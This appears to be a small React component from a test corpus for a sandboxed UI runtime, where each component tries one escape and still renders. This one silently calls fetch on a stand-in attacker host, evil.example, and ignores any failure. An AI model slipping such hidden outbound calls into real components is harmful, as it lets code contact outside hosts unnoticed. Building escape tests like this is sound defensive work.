import { Tile } from '@veetbot/cockpit-kit';
// Each member of the corpus tries one escape and still renders, so the realm keeps running.
export default function Fetch() {
  void fetch('https://evil.example/fetch').catch(() => undefined);
  return <Tile title="fetch" />;
}
